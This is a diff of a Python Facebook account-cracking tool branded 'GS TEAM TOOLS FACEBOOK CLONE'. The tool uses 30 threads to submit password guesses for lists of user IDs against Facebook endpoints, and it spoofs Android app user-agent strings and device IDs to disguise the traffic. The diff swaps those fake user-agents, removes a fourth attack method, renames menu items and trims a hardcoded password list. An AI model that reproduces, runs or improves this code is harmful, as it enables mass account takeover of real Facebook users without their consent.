@@ -568,7 +568,7 @@ class crack:
         for pw in __juts__:
             try:
                 Mm = '\033[9;31m'
-                ua_string=random.choice(ugenn)
+                ua_string=random.choice(ugen3)
                 application_version = str(random.randint(300,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
                 application_version_code=str(random.randint(000000000,999999999))
                 adid=str(uuid.uuid4())
@@ -580,7 +580,7 @@ class crack:
                 b=str(random.choice(string.ascii_uppercase))
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
-                ua_string = 'SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt+' Build/'+gttt+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'+application_version_code+';FBAV/'+application_version+';FBDV/'+gtt+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
+                #ua_string = 'Sup#portsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt#+' Build/'#+gttt#+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'#+application_version_code#+';FBAV/'#+application_version#+';FBDV/'#+gtt#+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
                 data = {
                     'locale':'en-US',
                     'client_country_code':'US',
@@ -722,7 +722,7 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.0,width=2560,height=3840};FBLC/es_ES;FBRV/184805483;FBCR/LG;FBMF/Xiaomi;FBBD/LG;FBPN/com.facebook.katana;FBDV/Realme_X14;FBSV/15;FBOP/8;FBCA/x86_64;FBSS/;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=1.5,width=1440,height=1280};FBLC/it_IT;FBRV/707067993;FBCR/TECNO;FBMF/Xiaomi;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Realme_X7;FBSV/11;FBOP/5;FBCA/x86;FBSS/12;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
@@ -889,18 +889,17 @@ class crack:
         motd.clear()
         print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
         print (43*'-')
-        print ('\033[1;32m[1] METHOD 1')
-        print ('\033[1;32m[2] METHOD 2')
-        print ('\033[1;32m[3] METHOD 3')
-        print ('\033[1;32m[3] METHOD 4')
+        print ('\033[1;32m[1] Method 1')
+        print ('\033[1;32m[2] Method 2')
+        print ('\033[1;32m[3] Method 3')
         print (43*'-')
         vz = input('\033[1;36mSelect: \033[0;97m')
         if vz in ['1', '2', '3']:
             print (43*'-')
-            print ('\033[1;32m[1] CRACK (FAST)')
-            print ('\033[1;32m[2] CRACK (Slow)')
+            print ('\033[1;32m[1] Crack (Fast)')
+            print ('\033[1;32m[2] Crack (Slow)')
             motd.append('file')
-            print ('\033[1;32m[3] CRACK (SUPER SLOW)\033[0;97m')
+            print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
             uz = input('\033[1;36mSelect: \033[0;97m')
             time.sleep(0.5)
             print (43*'-')
@@ -917,7 +916,7 @@ class crack:
             print ('\x1b[1;92m ~~~~~~~GS TEAM TOOLS FACEBOOK CLONE~~~~~~~\x1b[1;97m')
             time.sleep(0.5)
             print (43*'-')
-            with GSXDRiyad(max_workers=30) as (__GSXDTEAM__):
+            with GSXDRiyad(max_workers=30) as (__GSXDbrand__):
                 for GSXDxd in self.id:
                     try:
                         uid, name = GSXDxd.split('|')
@@ -947,13 +946,7 @@ class crack:
                         elif vz == '3' and uz == '2':
                             __GSXDbrand__.submit(self.__mmb__,uid,pwx,url2)
                         elif vz == '3' and uz == '3':
-                            __GSXDbrand__.submit(self.__mmb__,uid,pwx,url1)
-                        elif vz == '4' and uz == '1':
-                            __GSXDbrand__.submit(self.__mmb4__,uid,pwx,url1)
-                        elif vz == '4' and uz == '2':
-                            __GSXDbrand__.submit(self.__mmb4__,uid,pwx,url2)
-                        elif vz == '4' and uz == '3':
-                            __GSXDbrand__.submit(self.__mmb4__,uid,pwx,url3)
+                            __GSXDbrand__.submit(self.__mmb__,uid,pwx,url3)
                         else:
                             __GSXDbrand__.submit(self.__mbasic__,uid,pwx,'p.facebook.com')
                     except:
@@ -1114,7 +1107,7 @@ class crack:
             print ('\033[1;32m[2]Choice Password\033[0;97m')
             pas=input('\033[0;97mSelect: ')
             if pas == '1':
-                pwz=['number', '57273200']
+                pwz=['57273200']
                 pwzz = '\n'.join(pwz)
                 pwzzz = (pwzz + '\n')
             elif pas == '2':
